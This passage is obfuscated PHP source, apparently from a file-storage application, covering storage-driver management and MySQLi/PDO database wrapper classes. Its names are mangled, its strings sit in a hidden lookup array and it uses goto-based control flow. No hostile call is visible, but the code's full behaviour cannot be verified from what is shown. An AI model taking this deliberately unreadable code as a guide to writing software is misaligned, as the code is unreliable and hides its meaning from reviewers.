$ÂÔÖêŞá; } $ğäÓ Ñö = array($ÕÊååéå[876] => $ÕÊååéå[443], $ÕÊååéå[2224] => $ÕÊååéå[76]); $˜³Å¬µ = array($ÕÊååéå[876] => array($ÕÊååéå[7], $§²Ó¥ğµ)); $ÂÔÖêŞá = Model($ÕÊååéå[848])->field($ğäÓ Ñö)->where($˜³Å¬µ)->group($ÕÊååéå[876])->select(); $ÂÔÖêŞá = array_to_keyvalue($ÂÔÖêŞá, $ÕÊååéå[443], $ÕÊååéå[76]); Cache::set($½õ·¤„ë, $ÂÔÖêŞá, 600); return $ÂÔÖêŞá; } public function getConfig($›¸ôÔÎ) { $°†ƒòŠû = parent::listData($›¸ôÔÎ); return json_decode($°†ƒòŠû[$_SERVER[íû‘ş´][6]], !0); } public function update($ˆÇûşÓ, $Ï–¨ËŸ) { $È°ÂÇ‚ =& $_SERVER[íû‘ş´]; $°ÏüÑ… = $Ï–¨ËŸ[$È°ÂÇ‚[32]]; $åƒâ¢« = array_to_keyvalue(parent::listData(), $È°ÂÇ‚[32]); if (isset($åƒâ¢«[$°ÏüÑ…]) && $åƒâ¢«[$°ÏüÑ…][$È°ÂÇ‚[443]] != $ˆÇûşÓ) { return !1; } $this->checkPwd($ˆÇûşÓ, $Ï–¨ËŸ); if (isset($Ï–¨ËŸ[$È°ÂÇ‚[2225]]) && $Ï–¨ËŸ[$È°ÂÇ‚[2225]] == $È°ÂÇ‚[88]) { $this->checkConfig($Ï–¨ËŸ); } unset($Ï–¨ËŸ[$È°ÂÇ‚[2225]]); $´±¼¢™¸ = parent::update($ˆÇûşÓ, $Ï–¨ËŸ); if ($´±¼¢™¸ && $Ï–¨ËŸ[$È°ÂÇ‚[37]]) { $áÀÒÓş = 0; foreach ($åƒâ¢« as $ë€ï¬úä) { if ($ë€ï¬úä[$È°ÂÇ‚[37]] && $ë€ï¬úä[$È°ÂÇ‚[443]] != $ˆÇûşÓ) { $áÀÒÓş = $ë€ï¬úä[$È°ÂÇ‚[443]]; parent::update($ë€ï¬úä[$È°ÂÇ‚[443]], array($È°ÂÇ‚[37] => 0)); } } $this->updateBackup($ˆÇûşÓ, $áÀÒÓş); } return $´±¼¢™¸; } public function add($Ş»Š°Û) { $¨Şó÷Èç =& $_SERVER[íû‘ş´]; $üÅ¶ÒŞ³ = array_to_keyvalue(parent::listData(), $¨Şó÷Èç[32]); if (isset($üÅ¶ÒŞ³[$Ş»Š°Û[$¨Şó÷Èç[32]]])) { return !1; } $this->checkConfig($Ş»Š°Û); $ÄıáÀÇ = parent::insert($Ş»Š°Û); if ($ÄıáÀÇ && $Ş»Š°Û[$¨Şó÷Èç[37]]) { foreach ($üÅ¶ÒŞ³ as $í†÷×Û”) { if ($í†÷×Û”[$¨Şó÷Èç[37]]) { parent::update($í†÷×Û”[$¨Şó÷Èç[443]], array($¨Şó÷Èç[37] => 0)); } } } return $ÄıáÀÇ; } public function updateBackup($ã·ŒşêË, $øĞïëÈ) { $ÓÑ‡¥ó˜ =& $_SERVER[íû‘ş´]; if (!$øĞïëÈ) { return; } $û‚úùğ” = Model($ÓÑ‡¥ó˜[808])->config(); if ($û‚úùğ”[$ÓÑ‡¥ó˜[1675]] != $ÓÑ‡¥ó˜[88] || $û‚úùğ”[$ÓÑ‡¥ó˜[810]] != $øĞïëÈ) { return; } $Šà·ğ»ğ = Model($ÓÑ‡¥ó˜[829])->get($ÓÑ‡¥ó˜[839]); $Šà·ğ»ğ = json_decode($Šà·ğ»ğ, !0); if (!$Šà·ğ»ğ) { return; } $Šà·ğ»ğ[$ÓÑ‡¥ó˜[810]] = $ã·ŒşêË; Model($ÓÑ‡¥ó˜[829])->set(array($ÓÑ‡¥ó˜[839] => $Šà·ğ»ğ)); } public function checkPwd($ĞØ£ıÉ, &$¡ßÀŸÂß) { $†„ÒÎ„É =& $_SERVER[íû‘ş´]; if (empty($¡ßÀŸÂß[$†„ÒÎ„É[6]])) { return; } $ç°äÑÂ¤ = json_decode($¡ßÀŸÂß[$†„ÒÎ„É[6]], !0); $°º¢í†ú = $†„ÒÎ„É[12]; $Üª¥•âƒ = array($†„ÒÎ„É[2226], $†„ÒÎ„É[2227], $†„ÒÎ„É[947]); foreach ($Üª¥•âƒ as $³ñÕİÑ˜) { if (isset($ç°äÑÂ¤[$³ñÕİÑ˜])) { $°º¢í†ú = $³ñÕİÑ˜; break; } } if (!$°º¢í†ú) { return; } $æ½„·ò = $this->getConfig($ĞØ£ıÉ); $Æ·«ú” = $æ½„·ò[$°º¢í†ú]; $•Æ©ÄÍ = $ç°äÑÂ¤[$°º¢í†ú]; if ($•Æ©ÄÍ == str_repeat($†„ÒÎ„É[203], strlen($Æ·«ú”))) { $ç°äÑÂ¤[$°º¢í†ú] = $Æ·«ú”; $¡ßÀŸÂß[$†„ÒÎ„É[6]] = json_encode($ç°äÑÂ¤); } else { if ($•Æ©ÄÍ != $Æ·«ú”) { $¡ßÀŸÂß[$†„ÒÎ„É[2225]] = $†„ÒÎ„É[88]; } } } public function checkConfig(&$ö”˜¥ü•, $èıëüËš = false) { $¾¢ë²‘ä =& $_SERVER[íû‘ş´]; $„şÉíÍ´ = strtolower($ö”˜¥ü•[$¾¢ë²‘ä[95]]); $»Öâõ„ã = json_decode($ö”˜¥ü•[$¾¢ë²‘ä[6]], !0); foreach ($»Öâõ„ã as $ÏË˜êÈş => $á§Îã½Ñ) { if (is_string($á§Îã½Ñ)) { $»Öâõ„ã[$ÏË˜êÈş] = trim($á§Îã½Ñ); } } $»Öâõ„ã[$¾¢ë²‘ä[2228]] = rand_string(6); $ùÆÒ¨šã = $GLOBALS[$¾¢ë²‘ä[6]][$¾¢ë²‘ä[89]][$¾¢ë²‘ä[885]]; $‰¶†„Ú = isset($ùÆÒ¨šã[$„şÉíÍ´]) ? $ùÆÒ¨šã[$„şÉíÍ´] : ucfirst($„şÉíÍ´); $ú¬ê™ş» = $¾¢ë²‘ä[74] . $‰¶†„Ú; if (!$‰¶†„Ú || !class_exists($ú¬ê™ş»)) { if ($èıëüËš) { return LNG($¾¢ë²‘ä[2229]); } write_log(array($¾¢ë²‘ä[2230], $ö”˜¥ü•, get_caller_info()), $¾¢ë²‘ä[2231]); show_json(LNG($¾¢ë²‘ä[2229]), !1, $ö”˜¥ü•); } $ˆ¤’„„ = new $ú¬ê™ş»($»Öâõ„ã); if (in_array($„şÉíÍ´, $ˆ¤’„„->objectDriver)) { if (!$ˆ¤’„„->isBucketCors() && !$ˆ¤’„„->setBucketCors()) { $Ì¼€¼ëµ = LNG($¾¢ë²‘ä[2232]); $Ì¼€¼ëµ .= $¾¢ë²‘ä[2233] . LNG($¾¢ë²‘ä[2234]); if ($èıëüËš) { return $Ì¼€¼ëµ; } show_json($Ì¼€¼ëµ, !1); } } $¥‰¼ÇÅº = rtrim($»Öâõ„ã[$¾¢ë²‘ä[1238]], $¾¢ë²‘ä[8]) . $¾¢ë²‘ä[8]; $¡Æ™–• = $ˆ¤’„„->getPath($¥‰¼ÇÅº . $¾¢ë²‘ä[1242]); if (!$ˆ¤’„„->mkfile($¡Æ™–•)) { if ($èıëüËš) { return LNG($¾¢ë²‘ä[2232]); } show_json(LNG($¾¢ë²‘ä[2232]), !1); } $»Öâõ„ã[$¾¢ë²‘ä[1238]] = $¥‰¼ÇÅº; $ö”˜¥ü•[$¾¢ë²‘ä[6]] = json_encode($»Öâõ„ã); $ö”˜¥ü•[$¾¢ë²‘ä[95]] = $‰¶†„Ú; return !0; } public function driverListSystem() { $ßÃÂ¥®– =& $_SERVER[íû‘ş´]; $İğÅÂ ç = parent::listData(); $´óş¢Óã = array(); foreach ($İğÅÂ ç as $Ë‘Í­ôë) { unset($Ë‘Í­ôë[$ßÃÂ¥®–[215]], $Ë‘Í­ôë[$ßÃÂ¥®–[85]]); $Ë‘Í­ôë[$ßÃÂ¥®–[6]] = json_decode($Ë‘Í­ôë[$ßÃÂ¥®–[6]], !0); $´óş¢Óã[] = $Ë‘Í­ôë; } return $´óş¢Óã; } public function defaultDriver() { $Ô†·âĞˆ =& $_SERVER[íû‘ş´]; $¾Õ¨ãú = parent::listData(); $¾ÖåÇóÇ = array_filter_by_field($¾Õ¨ãú, $Ô†·âĞˆ[37], 1); $¾ÖåÇóÇ = $¾ÖåÇóÇ[0]; if ($¾ÖåÇóÇ) { $¾ÖåÇóÇ[$Ô†·âĞˆ[6]] = json_decode($¾ÖåÇóÇ[$Ô†·âĞˆ[6]], !0); } return $¾ÖåÇóÇ; } public function driverInfo($×½’íìˆ) { $Ş±İ êø =& $_SERVER[íû‘ş´]; $Ãèğ‰Å = array_to_keyvalue(parent::listData(), $Ş±İ êø[443]); if (!isset($Ãèğ‰Å[$×½’íìˆ])) { return !1; } $“°¥¿Éé = $Ãèğ‰Å[$×½’íìˆ]; $“°¥¿Éé[$Ş±İ êø[6]] = json_decode($“°¥¿Éé[$Ş±İ êø[6]], !0); return $“°¥¿Éé; } public function remove($“°ğ¬áı) { $this->removeShareItems($“°ğ¬áı); return parent::remove($“°ğ¬áı); } public function removeWithFile($ì‘¨±‹×, $éßÆ¯¢©) { $ãµ¡×ºï =& $_SERVER[íû‘ş´]; $ßî‹›Ûû = array($ãµ¡×ºï[876] => $ì‘¨±‹×); $û¿´¶Ü = Model($ãµ¡×ºï[521])->where($ßî‹›Ûû)->count(); $–˜Ì¬² = Model($ãµ¡×ºï[521])->where($ßî‹›Ûû)->sum($ãµ¡×ºï[76]); $§ø˜àª = $éßÆ¯¢© . $ãµ¡×ºï[2235] . $ì‘¨±‹×; $•¦Ïúûú = LNG($éßÆ¯¢© == $ãµ¡×ºï[598] ? $ãµ¡×ºï[2236] : $ãµ¡×ºï[2237]); $ßı£¿–ñ = new TaskFileTransfer($§ø˜àª, $ãµ¡×ºï[2231], $û¿´¶Ü, $•¦Ïúûú . "\x28{$ì‘¨±‹×}\x29"); $ßı£¿–ñ->task[$ãµ¡×ºï[822]] = (double) $–˜Ì¬²; $‡¼µœ¿Ğ = KodIO::defaultDriver(); $ó¸™ïô¯ = $‡¼µœ¿Ğ[$ãµ¡×ºï[443]]; $üç¤Î¸ = "\173\151\x6f\x3a{$ó¸™ïô¯}\x7d\x2f"; $èË¥İ…Š = !0; $œÁŸ×ø• = array(); $ÏïÍ‰Üñ = Model($ãµ¡×ºï[214])->where($ßî‹›Ûû)->field($ãµ¡×ºï[2238])->select(); foreach ($ÏïÍ‰Üñ as $¬Øâµ¿Ö) { $©ÛüÛÇİ = $¬Øâµ¿Ö[$ãµ¡×ºï[84]]; $ÒÉ£·º¸ = $üç¤Î¸ . str_replace("\x7b\151\x6f\x3a{$ì‘¨±‹×}\175\57", $ãµ¡×ºï[12], $©ÛüÛÇİ); if (!IO::exist($©ÛüÛÇİ)) { $œÁŸ×ø•[] = $¬Øâµ¿Ö[$ãµ¡×ºï[518]]; $ßı£¿–ñ->updateFileEnd($¬Øâµ¿Ö[$ãµ¡×ºï[32]], $¬Øâµ¿Ö[$ãµ¡×ºï[76]]); continue; } if (IO::exist($ÒÉ£·º¸)) { $ßı£¿–ñ->updateFileEnd($¬Øâµ¿Ö[$ãµ¡×ºï[32]], $¬Øâµ¿Ö[$ãµ¡×ºï[76]]); continue; } if (!IO::move($©ÛüÛÇİ, get_path_father($ÒÉ£·º¸))) { $èË¥İ…Š = !1; break; } $ßî‹›Ûû = array($ãµ¡×ºï[518] => $¬Øâµ¿Ö[$ãµ¡×ºï[518]]); $Î»¯ƒÖ = array($ãµ¡×ºï[876] => $ó¸™ïô¯, $ãµ¡×ºï[84] => $ÒÉ£·º¸); Model($ãµ¡×ºï[214])->where($ßî‹›Ûû)->save($Î»¯ƒÖ); } $this->removeByFileID($œÁŸ×ø•); if (!$èË¥İ…Š) { $ßı£¿–ñ->stop($§ø˜àª); return !1; } $ßı£¿–ñ->end(); if ($éßÆ¯¢© == $ãµ¡×ºï[1872]) { $this->remove($ì‘¨±‹×); } } public function progress($úÅÀğ¥ô, $àáş°òğ) { return Task::get($àáş°òğ . $_SERVER[íû‘ş´][2235] . $úÅÀğ¥ô); } private function removeByFileID($™ÑñÛ = array()) { $öš´½ş =& $_SERVER[íû‘ş´]; if (empty($™ÑñÛ)) { return; } $ÎÅ²íÛŒ = array($öš´½ş[518] => array($öš´½ş[7], $™ÑñÛ)); $Èƒ·±¬í = Model($öš´½ş[1390])->where($ÎÅ²íÛŒ)->field($öš´½ş[181])->select(); if (!$Èƒ·±¬í) { return; } $Èƒ·±¬í = array_to_keyvalue($Èƒ·±¬í, $öš´½ş[12], $öš´½ş[181]); foreach ($Èƒ·±¬í as $ÚÒ˜µ) { Model($öš´½ş[467])->removeNow($ÚÒ˜µ, !1); } } private function removeShareItems($¤ö”³±¢) { $Ş£òç³ç =& $_SERVER[íû‘ş´]; $×ºÒ…éœ = "\x7b\x69\157\x3a{$¤ö”³±¢}\175\57"; $å£×”üÖ = array($Ş£òç³ç[181] => 0, $Ş£òç³ç[1233] => array($Ş£òç³ç[427], "{$×ºÒ…éœ}\x25")); $Æ¸ü¬¸ = Model($Ş£òç³ç[1883])->where($å£×”üÖ)->field($Ş£òç³ç[643])->select(); if (empty($Æ¸ü¬¸)) { return; } $Î¢•š®ƒ = array_to_keyvalue($Æ¸ü¬¸, $Ş£òç³ç[12], $Ş£òç³ç[643]); Model($Ş£òç³ç[642])->remove($Î¢•š®ƒ); } } goto Fà‹‰«İ†Š; a·š±¬Âîñ: class DbMysqli extends Db { public function __construct($Âª±İâ¬ = '') { $ˆèÁ¯¶ =& $_SERVER[íû‘ş´]; if (!extension_loaded($ˆèÁ¯¶[970])) { think_exception(think_lang($ˆèÁ¯¶[14]) . $ˆèÁ¯¶[971]); } if (!empty($Âª±İâ¬)) { $this->config = $Âª±İâ¬; if (empty($this->config[$ˆèÁ¯¶[17]])) { $this->config[$ˆèÁ¯¶[17]] = $ˆèÁ¯¶[12]; } } } public function connect($ÓàâúÂ™ = '', $»é¢ŞÌ = 0) { $Ë•ƒäï§ =& $_SERVER[íû‘ş´]; if (!isset($this->linkID[$»é¢ŞÌ])) { if (empty($ÓàâúÂ™)) { $ÓàâúÂ™ = $this->config; } $this->linkID[$»é¢ŞÌ] = new mysqli($ÓàâúÂ™[$Ë•ƒäï§[944]], $ÓàâúÂ™[$Ë•ƒäï§[946]], $ÓàâúÂ™[$Ë•ƒäï§[947]], $ÓàâúÂ™[$Ë•ƒäï§[21]], $ÓàâúÂ™[$Ë•ƒäï§[945]] ? intval($ÓàâúÂ™[$Ë•ƒäï§[945]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ú’Êãø = $this->linkID[$»é¢ŞÌ]->server_version; $this->linkID[$»é¢ŞÌ]->query($Ë•ƒäï§[948] . think_config($Ë•ƒäï§[949]) . $Ë•ƒäï§[58]); if ($Ú’Êãø > $Ë•ƒäï§[950]) { $this->linkID[$»é¢ŞÌ]->query($Ë•ƒäï§[951]); } $this->connected = !0; if (1 != think_config($Ë•ƒäï§[22])) { unset($this->config); } } return $this->linkID[$»é¢ŞÌ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($û¹™„‡‡) { $¹ÓºÎşù =& $_SERVER[íû‘ş´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $û¹™„‡‡; if ($this->queryID) { $this->free(); } think_action_status($¹ÓºÎşù[23], 1); think_status($¹ÓºÎşù[24]); $this->queryID = $this->_linkID->query($û¹™„‡‡); if ($this->_linkID->more_results()) { while (($‹šÌœÕ = $this->_linkID->next_result()) != NULL) { $‹šÌœÕ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($©øÒÕ„º) { $–öåî€¾ =& $_SERVER[íû‘ş´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©øÒÕ„º; if ($this->queryID) { $this->free(); } think_action_status($–öåî€¾[25], 1); think_status($–öåî€¾[24]); $ôúÖÁß¼ = $this->_linkID->query($©øÒÕ„º); $this->debug(); if (!1 === $ôúÖÁß¼) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕÈéâğµ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÕÈéâğµ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $áˆµ‡®½ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$áˆµ‡®½) { $this->error(); return !1; } } return !0; } private function getAll() { $‡‘–”ëş = array(); if ($this->numRows > 0) { for ($ëŸ£¸ = 0; $ëŸ£¸ < $this->numRows; $ëŸ£¸++) { $‡‘–”ëş[$ëŸ£¸] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $‡‘–”ëş; } public function getFields($¸ã± ó÷) { $Í›‹×® =& $_SERVER[íû‘ş´]; $Ñğº–éò = $this->query($Í›‹×®[955] . $this->parseKey($¸ã± ó÷)); $Ø°¯ô = array(); if ($Ñğº–éò) { foreach ($Ñğº–éò as $åˆ¸…³– => $ˆ¬—Î›ğ) { $Ø°¯ô[$ˆ¬—Î›ğ[$Í›‹×®[31]]] = array($Í›‹×®[32] => $ˆ¬—Î›ğ[$Í›‹×®[31]], $Í›‹×®[33] => $ˆ¬—Î›ğ[$Í›‹×®[34]], $Í›‹×®[35] => (bool) ($ˆ¬—Î›ğ[$Í›‹×®[36]] === $Í›‹×®[12]), $Í›‹×®[37] => $ˆ¬—Î›ğ[$Í›‹×®[38]], $Í›‹×®[39] => strtolower($ˆ¬—Î›ğ[$Í›‹×®[40]]) == $Í›‹×®[41], $Í›‹×®[42] => strtolower($ˆ¬—Î›ğ[$Í›‹×®[43]]) == $Í›‹×®[44]); } } return $Ø°¯ô; } public function getTables($åÔ¼·“© = '') { $”„«¬ĞÀ =& $_SERVER[íû‘ş´]; $¾ËÃºÙ® = !empty($åÔ¼·“©) ? $”„«¬ĞÀ[957] . $åÔ¼·“© . $”„«¬ĞÀ[958] : $”„«¬ĞÀ[959]; $´¦¥¨ = $this->query($¾ËÃºÙ®); $¤¶ œß€ = array(); if ($´¦¥¨) { foreach ($´¦¥¨ as $È°ôŸ…Ö => $„áÌ’Øâ) { $¤¶ œß€[$È°ôŸ…Ö] = current($„áÌ’Øâ); } } return $¤¶ œß€; } public function replace($áÓî½®¸, $§¢ˆŸê = array()) { $“§ğë¿ =& $_SERVER[íû‘ş´]; foreach ($áÓî½®¸ as $•Ô°ıö± => $Â¹“—ŸÆ) { $Š½ø™—ß = $this->parseValue($Â¹“—ŸÆ); if (is_scalar($Š½ø™—ß)) { $«©éš™[] = $Š½ø™—ß; $ãÈØäíç[] = $this->parseKey($•Ô°ıö±); } } $Åâ³‡¿ = $“§ğë¿[960] . $this->parseTable($§¢ˆŸê[$“§ğë¿[323]]) . $“§ğë¿[961] . implode($“§ğë¿[50], $ãÈØäíç) . $“§ğë¿[962] . implode($“§ğë¿[50], $«©éš™) . $“§ğë¿[963]; return $this->execute($Åâ³‡¿); } public function insertAll($Ì¥ÌÌÍ, $¢‘â¨‚ = array(), $“§œÈ› = false) { $³ËŸçª« =& $_SERVER[íû‘ş´]; if (!is_array($Ì¥ÌÌÍ[0])) { return !1; } $îÏáŠ¥ = array_keys($Ì¥ÌÌÍ[0]); $‰«±İÚÕ = array(); foreach ($Ì¥ÌÌÍ as $‘±šˆï¡) { $°—ª†ëß = array(); foreach ($‘±šˆï¡ as $ª‹‚€±¡ => $ÇÉéü‡î) { $ÇÉéü‡î = $this->parseValue($ÇÉéü‡î); if (is_scalar($ÇÉéü‡î)) { $°—ª†ëß[] = $ÇÉéü‡î; } } $‰«±İÚÕ[] = $³ËŸçª«[304] . implode($³ËŸçª«[50], $°—ª†ëß) . $³ËŸçª«[963]; } array_walk($îÏáŠ¥, array($this, $³ËŸçª«[964])); $˜›´¡º = $“§œÈ› ? $³ËŸçª«[965] : $³ËŸçª«[966]; $‡Ÿû”«† = $˜›´¡º . $³ËŸçª«[967] . $this->parseTable($¢‘â¨‚[$³ËŸçª«[323]]) . $³ËŸçª«[961] . implode($³ËŸçª«[50], $îÏáŠ¥) . $³ËŸçª«[968] . implode($³ËŸçª«[50], $‰«±İÚÕ); return $this->execute($‡Ÿû”«†); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¹Ğø³ş =& $_SERVER[íû‘ş´]; $this->error = $this->_linkID->errno . $¹Ğø³ş[4] . $this->_linkID->error; if ($¹Ğø³ş[12] != $this->queryStr) { $this->error .= LNG($¹Ğø³ş[48]) . $this->queryStr; } think_trace($this->error, $¹Ğø³ş[12], $¹Ğø³ş[49]); return $this->error; } public function escapeString($” ²ˆìó) { if ($this->_linkID) { return $this->_linkID->real_escape_string($” ²ˆìó); } else { return addslashes($” ²ˆìó); } } public function parseKey(&$êÊøˆúã, $Êöùùæ = true) { $ÍÙõ¹Ù =& $_SERVER[íû‘ş´]; if ($Êöùùæ) { $êÊøˆúã = $this->parseKeyCheck($êÊøˆúã); } if ($êÊøˆúã != $ÍÙõ¹Ù[203] && !preg_match($ÍÙõ¹Ù[969], $êÊøˆúã)) { $êÊøˆúã = $ÍÙõ¹Ù[429] . trim($êÊøˆúã, $ÍÙõ¹Ù[429]) . $ÍÙõ¹Ù[429]; } return $êÊøˆúã; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($İ‰Ûğí» = '') { $ÌŞæ‘Œ =& $_SERVER[íû‘ş´]; if (!class_exists($ÌŞæ‘Œ[972])) { think_exception(think_lang($ÌŞæ‘Œ[14]) . $ÌŞæ‘Œ[973]); } if (!empty($İ‰Ûğí»)) { $this->config = $İ‰Ûğí»; if (empty($this->config[$ÌŞæ‘Œ[17]])) { $this->config[$ÌŞæ‘Œ[17]] = array(); } } } public function connect($ıßßÇô± = '', $Û«Åş¨¤ = 0) { $Ÿïç¯êö =& $_SERVER[íû‘ş´]; if (!isset($this->linkID[$Û«Åş¨¤])) { if (empty($ıßßÇô±)) { $ıßßÇô± = $this->config; } $Üæà—Ó† = !empty($ıßßÇô±[$Ÿïç¯êö[17]][$Ÿïç¯êö[18]]) ? $ıßßÇô±[$Ÿïç¯êö[17]][$Ÿïç¯êö[18]] : $this->pconnect; if ($Üæà—Ó†) { $ıßßÇô±[$Ÿïç¯êö[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Û«Åş¨¤] = new PDO($ıßßÇô±[$Ÿïç¯êö[974]], $ıßßÇô±[$Ÿïç¯êö[946]], $ıßßÇô±[$Ÿïç¯êö[947]], $ıßßÇô±[$Ÿïç¯êö[17]]); } catch (PDOException $Í™é¢›) { think_exception($Í™é¢›->getMessage()); } $this->dbType = $this->_getDsnType($ıßßÇô±[$Ÿïç¯êö[974]]); if (in_array($this->dbType, array($Ÿïç¯êö[975], $Ÿïç¯êö[976], $Ÿïç¯êö[977], $Ÿïç¯êö[978]))) { think_exception($Ÿïç¯êö[979] . $this->dbType . $Ÿïç¯êö[980] . $this->dbType . $Ÿïç¯êö[981]); } if (!$this->linkID[$Û«Åş¨¤]) { think_exception($Ÿïç¯êö[982]); } try { $this->linkID[$Û«Åş¨¤]->exec($Ÿïç¯êö[983] . think_config($Ÿïç¯êö[949])); } catch (Exception $Í™é¢›) { } $this->connected = !0; if (1 != think_config($Ÿïç¯êö[22])) { unset($this->config); } } return $this->linkID[$Û«Åş¨¤]; } public function free() { $this->PDOStatement = null; } public function query($½ÎáöÕ¢, $Í½™ìù“ = array()) { $€„üüñ¹ =& $_SERVER[íû‘ş´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½ÎáöÕ¢; if (!empty($Í½™ìù“)) { $this->queryStr .= $€„üüñ¹[984] . print_r($Í½™ìù“, !0) . $€„üüñ¹[985]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($€„üüñ¹[23], 1); think_status($€„üüñ¹[24]); $this->PDOStatement = $this->_linkID->prepare($½ÎáöÕ¢); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¦°ÁõğØ = $this->PDOStatement->execute($Í½™ìù“); $this->debug(); if (!1 === $¦°ÁõğØ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($üõ±Ûœ³, $şáÂ‰èĞ = array()) { $Üô“¢ =& $_SERVER[íû‘ş´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $üõ±Ûœ³; if (!empty($şáÂ‰èĞ)) { $this->queryStr .= $Üô“¢[984] . print_r($şáÂ‰èĞ, !0) . $Üô“¢[985]; } $¾ÔŸ‚÷Ü = !1; if ($this->dbType == $Üô“¢[978]) { if (preg_match($Üô“¢[986], $this->queryStr, $¸«ª‹Š…)) { $this->table = think_config($Üô“¢[987]) . str_ireplace(think_config($Üô“¢[988]), $Üô“¢[422], $¸«ª‹Š…[2]); $¾ÔŸ‚÷Ü = (bool) $this->query($Üô“¢[989] . strtoupper($this->table) . $Üô“¢[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Üô“¢[25], 1); think_status($Üô“¢[24]); $this->PDOStatement = $this->_linkID->prepare($üõ±Ûœ³); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $§ è±­§ = $this->PDOStatement->execute($şáÂ‰èĞ); $this->debug(); if (!1 === $§ è±­§) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¾ÔŸ‚÷Ü || preg_match($Üô“¢[990], $üõ±Ûœ³)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Õª»Æ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Õª»Æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿï‚°€ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ÿï‚°€) { $this->error(); return !1; } } return !0; } private function getAll() { $Å”ïª†Ü = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Å”ïª†Ü); return $Å”ïª†Ü; } public function getFields($ÛÔ¿—ı˜) { $Ûô¾ìœª =& $_SERVER[íû‘ş´]; $this->initConnect(!0); if (think_config($Ûô¾ìœª[991])) { $òÁê•§ = str_replace($Ûô¾ìœª[992], $ÛÔ¿—ı˜, think_config($Ûô¾ìœª[991])); } else { switch ($this->dbType) { case $Ûô¾ìœª[975]: case $Ûô¾ìœª[993]: $òÁê•§ = "\123\105\114\105\103\x54\x20\x20\40\x63\157\154\x75\x6d\x6e\137\x6e\141\155\145\x20\x61\x73\x20\x27\x4e\x61\155\145\x27\54\x20\40\x20\x64\141\164\141\x5f\164\x79\x70\145\40\x61\x73\40\x27\x54\x79\160\x65\47\54\40\x20\x20\143\x6f\x6c\165\x6d\156\137\144\x65\x66\141\165\x6c\164\40\x61\x73\x20\47\104\145\146\141\165\154\x74\47\x2c\40\40\40\x69\x73\x5f\156\x75\154\154\141\142\154\x65\40\x61\x73\40\47\x4e\165\x6c\154\x27\12\x9\11\x46\x52\x4f\x4d\x9\151\156\146\157\162\x6d\x61\164\151\x6f\156\x5f\163\x63\x68\x65\155\x61\56\164\141\x62\x6c\x65\163\40\x41\x53\x20\164\xa\11\11\112\x4f\111\116\x9\151\x6e\x66\x6f\162\x6d\141\x74\x69\x6f\x6e\x5f\163\143\x68\145\x6d\x61\56\143\157\x6c\165\155\x6e\x73\x20\x41\x53\x20\143\xa\11\x9\117\x4e\40\40\x74\56\164\x61\142\x6c\x65\137\x63\141\x74\141\x6c\157\x67\x20\75\x20\143\56\x74\x61\x62\x6c\145\137\143\141\164\141\x6c\x6f\147\12\11\11\x41\x4e\x44\x20\x74\x2e\x74\141\x62\154\x65\137\163\x63\x68\x65\x6d\141\40\75\x20\x63\56\x74\x61\142\x6c\145\137\x73\143\x68\145\x6d\141\12\11\11\101\x4e\104\40\164\56\x74\x61\x62\154\145\x5f\156\x61\x6d\145\40\x3d\x20\x63\x2e\164\x61\x62\154\145\137\x6e\141\x6d\x65\xa\x9\x9\127\110\105\122\x45\x20\x20\x20\164\x2e\x74\141\x62\154\x65\137\x6e\x61\x6d\145\x20\75\40\47{$ÛÔ¿—ı˜}\x27"; break; case $Ûô¾ìœª[994]: $òÁê•§ = $Ûô¾ìœª[995] . $ÛÔ¿—ı˜ . $Ûô¾ìœª[996]; break; case $Ûô¾ìœª[976]: case $Ûô¾ìœª[978]: $òÁê•§ = $Ûô¾ìœª[997] . $Ûô¾ìœª[998] . $Ûô¾ìœª[999] . strtoupper($ÛÔ¿—ı˜) . $Ûô¾ìœª[1000] . strtoupper($ÛÔ¿—ı˜) . $Ûô¾ìœª[1001]; break; case $Ûô¾ìœª[1002]: $òÁê•§ = $Ûô¾ìœª[1003] . $ÛÔ¿—ı˜ . $Ûô¾ìœª[1004]; break; case $Ûô¾ìœª[977]: break; case $Ûô¾ìœª[1005]: default: $òÁê•§ = $Ûô¾ìœª[1006] . ($this->dbType == $Ûô¾ìœª[1005] ? "\x60{$ÛÔ¿—ı˜}\x60" : $ÛÔ¿—ı˜); } } $‡©Ğ±“ = $this->query($òÁê•§); $ßûÅ†ê = array(); if ($‡©Ğ±“) { foreach ($‡©Ğ±“ as $È¶şÏ™· => 